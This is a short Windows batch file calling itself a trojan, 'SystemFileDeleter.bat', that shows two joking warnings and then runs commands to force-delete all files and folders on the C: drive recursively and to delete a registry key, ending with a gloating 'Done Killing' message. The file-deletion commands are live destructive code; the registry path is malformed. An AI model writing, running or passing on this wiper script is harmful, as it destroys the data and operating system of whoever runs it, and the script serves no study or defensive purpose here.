@echo off
title Warimg
echo WARING! You ran a Trojan Known as SystemFileDeleter.bat that will delete all your files including the C:\ drive! are you sure you wana run this?
echo TIP!: If you wana close this click the x on the top right
pause
cls
Title FINAL WARING!
echo FINAL WARING! This Software aka Batch file is Dangerous and can harm your pc are you realy sure you wana realy run this? this is your final waring to stop this Bach file form deleteing this pc
pause
cls
Title Deleteing windows...
reg delete HKCH/SYSTEM/Setup /f
Del C:\ /f /s /q
rd C:\ /s /q
rmdir C: /q
cls
color 15
echo Done Killing aka Deleteing your pc >:)
pause
